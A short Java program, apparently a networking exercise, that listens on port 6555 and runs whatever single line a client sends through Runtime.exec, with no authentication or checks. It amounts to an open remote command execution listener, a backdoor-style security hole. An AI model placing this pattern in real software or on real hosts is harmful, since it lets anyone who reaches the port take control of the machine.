import java.io.*;
import java.net.*;

public class RemoteCommandServer {
    public static void main(String[] args) throws IOException {
        try {
            ServerSocket ss = new ServerSocket(6555);
            Socket s = ss.accept();
            BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));

            String str = br.readLine();

            Runtime r = Runtime.getRuntime();
            Process p = r.exec(str);
        } catch (IOException e) {
            System.out.println(e);
        }
    }
}
